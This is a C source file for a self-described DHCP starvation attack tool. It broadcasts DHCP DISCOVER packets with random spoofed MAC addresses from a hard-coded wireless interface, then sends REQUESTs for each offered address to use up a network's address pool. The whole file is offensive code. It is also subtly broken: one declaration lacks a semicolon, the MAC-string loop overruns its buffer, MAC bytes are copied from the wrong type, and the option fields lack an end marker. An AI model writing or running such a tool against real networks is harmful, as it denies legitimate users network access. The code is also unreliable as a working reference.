#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<math.h>
#include<arpa/inet.h>
#include<sys/time.h>
#include<sys/types.h>
#include<time.h>
#include<unistd.h>
#include<features.h>
#include<linux/if_ether.h>
#include<fcntl.h>
#include<getopt.h>
#include<locale.h>
#include<net/if.h>
#include<netdb.h>
#include<netinet/in.h>
#include<sys/ioctl.h>
#include<sys/socket.h>

typedef struct DHCPpacket {
    u_int8_t op;
    u_int8_t htype;
    u_int8_t hlen;
    u_int8_t hops;
    u_int32_t xid;
    u_int16_t secs;
    u_int16_t flags;
    struct in_addr ciaddr;
    struct in_addr yiaddr;
    struct in_addr siaddr;
    struct in_addr giaddr;
    char chaddr[16];
    char sname[64];
    char file[128];
    char opt[250];
}pkt;

#define PACKET 2

int sock;
unsigned char cli_addr[6];
char ifc_name[5] = "wlo1";
u_int32_t trans_id ;
struct in_addr addr_final;
struct in_addr server_addr


int pkt_send(struct sockaddr_in *server, void *temp, int temp_len)
{

    sendto(sock, (char *)temp, temp_len, 0, (struct sockaddr *)server, sizeof(*server));

}


void send_DISCOVER()
{
    char addr[17];
    char characters[16] = "abcdef0123456789";

    for (int i = 0; i <=16; i++) {
        int x = rand() % 16;
        addr[i] = characters[x];
    }
    addr[2] = ':';
    addr[5] = ':';
    addr[8] = ':';
    addr[11] = ':';
    addr[14] = ':';
    addr[17] = '\0';

    unsigned int rand_mac_add[16];
    sscanf(addr, "%x:%x:%x:%x:%x:%x", rand_mac_add, rand_mac_add + 1, rand_mac_add + 2, rand_mac_add + 3, rand_mac_add + 4, rand_mac_add + 5);

    struct ifreq ifr;
    strncpy((char *)&ifr.ifr_name, ifc_name, sizeof(ifr.ifr_name));
    memcpy(&ifr.ifr_hwaddr.sa_data, &rand_mac_add[0], 6);

    for (int i = 0; i < 6; ++i)
        cli_addr[i] = rand_mac_add[i];
    printf("\nGENERATED MAC ADDRESS: ");
    for (int i = 0; i < 6; ++i)
        printf("%x", rand_mac_add[i]);
    printf("\n");
//******************************************************************************

    struct sockaddr_in bc_server;
    bc_server.sin_family = AF_INET;
    bc_server.sin_port = htons(67);
    bc_server.sin_addr.s_addr = INADDR_BROADCAST;
    memset(&bc_server.sin_zero, 0, sizeof(bc_server.sin_zero));

    trans_id = random();

    pkt discover;
    memset(&discover, 0, sizeof(discover));
    memcpy(discover.chaddr, cli_addr, 6);

    discover.op = 1;
    discover.htype = 1;
    discover.hlen = 6;
    discover.hops = 0;
    discover.xid = htonl(trans_id);
    discover.secs = 0x00;
    discover.flags = htons(32768);

    discover.opt[0] = '\x63';
    discover.opt[1] = '\x82';
    discover.opt[2] = '\x53';
    discover.opt[3] = '\x63';
    discover.opt[4] = 53;
    discover.opt[5] = '\x01';
    discover.opt[6] =1;

    int s = sizeof(discover);
    pkt_send(&bc_server, &discover, s);

}


void send_REQUEST()
{
    struct sockaddr_in bc_server;
    bc_server.sin_family = AF_INET;
    bc_server.sin_port = htons(67);
    bc_server.sin_addr.s_addr = INADDR_BROADCAST;
    memset(&bc_server.sin_zero, 0, sizeof(bc_server.sin_zero));

    pkt request;
    memset(&request, 0, sizeof(request));
    memcpy(request.chaddr, cli_addr, 6);

    request.op = 1;
    request.htype = 1;
    request.hlen = 6;
    request.hops = 0;
    request.xid = htonl(trans_id);
    request.secs = 0x00;
    request.flags = htons(32768);
    request.siaddr = server_addr;
    request.ciaddr = addr_final;

    request.opt[0] = '\x63';
    request.opt[1] = '\x82';
    request.opt[2] = '\x53';
    request.opt[3] = '\x63';
    request.opt[4] = 53;
    request.opt[5] = '\x01';
    request.opt[6] = 3;
    request.opt[7] = 50;
    request.opt[8] = '\x04';
    memcpy(&request.opt[9], &addr_final, sizeof(addr_final));
    request.opt[13] = 54;
    request.opt[14] = '\x04';
    memcpy(&request.opt[15], &server_addr, sizeof(server_addr));
    request.opt[19] = '\xFF';

    int s = sizeof(request);
    pkt_send(&bc_server, &request, s);

    printf("REQUESTED ADDRESS: %s\n", inet_ntoa(addr_final));
}


void pkt_rcv(struct sockaddr_in *server, void *temp, int temp_len)
{
    struct sockaddr_in temp_addr;
    memset(&temp_addr, 0, sizeof(temp_addr));

    socklen_t s = sizeof(temp_addr);

    recvfrom(sock, (char *)temp, temp_len, MSG_PEEK, (struct sockaddr *)&temp_addr, &s);
    recvfrom(sock, (char *)temp, temp_len, 0, (struct sockaddr *)&temp_addr, &s);
    memcpy(server, &temp_addr, sizeof(temp_addr));

}
void rcv_OFFER()
{
    while(1)
    {
        pkt offer;
        memset(&offer, 0, sizeof(offer));

        struct sockaddr_in p;
        memset(&p, 0, sizeof(p));

        fd_set fd;
        FD_ZERO(&fd);
        FD_SET(sock, &fd);

        struct timeval t1;
        t1.tv_sec = 2;

        select(sock + 1, &fd, 0, 0, &t1);
        pkt_rcv(&p, &offer, sizeof(offer));

        if (ntohl(offer.xid) != trans_id) {
            continue;
        }

        addr_final = offer.yiaddr;
        printf("OFFERED ADDRESS: %s\n", inet_ntoa(addr_final));

        server_addr = p.sin_addr;
        send_REQUEST();
        break;
    }

}

int main(int argc, char *argv[]) {

    printf("DHCP Stravation Attack:\n");

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    printf("File descriptor for new socket: %d\n", sock);

    struct sockaddr_in name;
    memset(&name, 0, sizeof(name));
    name.sin_family = AF_INET;
    name.sin_port = htons(68);
    name.sin_addr.s_addr = INADDR_ANY;
    memset(&name.sin_zero, 0, sizeof(name.sin_zero));

    int option_value = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&option_value, sizeof(option_value));
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *)&option_value, sizeof(option_value));

    struct ifreq ifc;
    strncpy(ifc.ifr_ifrn.ifrn_name, ifc_name, strlen(ifc_name) + 1);
    setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *)&ifc, sizeof(ifc));
    bind(sock, (struct sockaddr *)&name, sizeof(name));

//**************************************************

    for (int i = 0; i < PACKET; i++)
    {
        send_DISCOVER();
        rcv_OFFER();
    }
    close(sock);

    return 0;
}
